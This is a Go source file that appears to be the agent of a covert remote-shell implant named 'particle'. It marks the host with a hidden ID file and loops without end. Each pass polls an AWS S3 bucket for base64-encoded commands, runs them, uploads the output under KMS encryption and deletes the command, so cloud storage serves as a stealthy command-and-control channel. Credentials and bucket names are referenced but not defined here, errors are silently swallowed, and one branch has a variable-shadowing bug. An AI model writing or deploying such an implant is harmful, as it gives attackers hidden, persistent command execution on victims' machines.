package main

import (
    "context"
    "io/ioutil"
    "encoding/base64"
    "bytes"

    "github.com/aws/aws-sdk-go-v2/aws"
    "github.com/aws/aws-sdk-go-v2/config"
    "github.com/aws/aws-sdk-go-v2/credentials"
    "github.com/aws/aws-sdk-go-v2/service/s3"
    "github.com/aws/aws-sdk-go-v2/service/s3/types"

    "os"
    "math/rand"
    "time"
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

var seededRand *rand.Rand = rand.New(
       rand.NewSource(time.Now().UnixNano()))

func StringWithCharset(length int, charset string) string {
       b := make([]byte, length)
       for i := range b {
        b[i] = charset[seededRand.Intn(len(charset))]
       }
       return string(b)
}

func String(length int) string {
       return StringWithCharset(length, charset)
}

func fileExists(filename string) bool {
    info, err := os.Stat(filename)
    if os.IsNotExist(err) {
        return false
    }
    return !info.IsDir()
}

func decodeBase64(encoded string) (string, error) {
    decodedBytes, err := base64.StdEncoding.DecodeString(encoded)
    if err != nil {}
    return string(decodedBytes), nil
}

func main() {
    //region := "us-east-1"

    cfg, err := config.LoadDefaultConfig(context.TODO(),
        config.WithRegion(region),
        config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, "")),
    )
    if err != nil {}

    s3Client := s3.NewFromConfig(cfg)

    particlename := ""

    if fileExists("./.particle") {
        pn, _ := ioutil.ReadFile("./.particle")
        particlename = string(pn)
        if particlename == "" {
            particlename := String(10)
            f, err := os.Create("./.particle")
            _, err = f.WriteString(particlename)
            if err != nil{}
        }

    }else {
        particlename = String(10)
        f, err := os.Create("./.particle")
        _, err = f.WriteString(particlename)
        if err != nil{}
    }

    particlepath := particlename + "/"
    particlecommand := particlepath + key
    particleoutput := particlepath + newKey

    for {
        commandString := ""
        output := ""

        _, err = s3Client.GetObject(context.TODO() ,&s3.GetObjectInput{
                Bucket: aws.String(bucket),
                Key:    aws.String(particlepath),
            })

        if err != nil {
            _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{
                Bucket: aws.String(bucket),
                Key:    aws.String(particlepath),
                ServerSideEncryption: types.ServerSideEncryptionAwsKms,
                SSEKMSKeyId:          aws.String(kmsKeyID),
            })
        }

        getObjectOutput, err := s3Client.GetObject(context.TODO(), &s3.GetObjectInput{
            Bucket: aws.String(bucket),
            Key:    aws.String(particlecommand),
        })

        if err == nil {
            defer getObjectOutput.Body.Close()
            encodedString, err := ioutil.ReadAll(getObjectOutput.Body)
            commandStringInFile, err := decodeBase64(string(encodedString))
            commandString = commandStringInFile
            if err != nil {
                output = err.Error()
            }

            if commandString == "exit_particle_shell" {
                break

            } else {
                output = commands(commandString, particlename, kmsKeyID)
                _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{
                    Bucket: aws.String(bucket),
                    Key:    aws.String(particleoutput),
                    Body:   bytes.NewReader([]byte(output)),
                    ServerSideEncryption: types.ServerSideEncryptionAwsKms,
                    SSEKMSKeyId:          aws.String(kmsKeyID),
                })
                
                if err != nil {
                    //return "Error Putting File " + err.Error()

                }
                
                _, err = s3Client.DeleteObject(context.TODO(), &s3.DeleteObjectInput{
                    Bucket: aws.String(bucket),
                    Key:    aws.String(particlecommand),
                })
                if err != nil {
                    //return "Error Deleting File " + err.Error()

                }
            }

        }
    }
}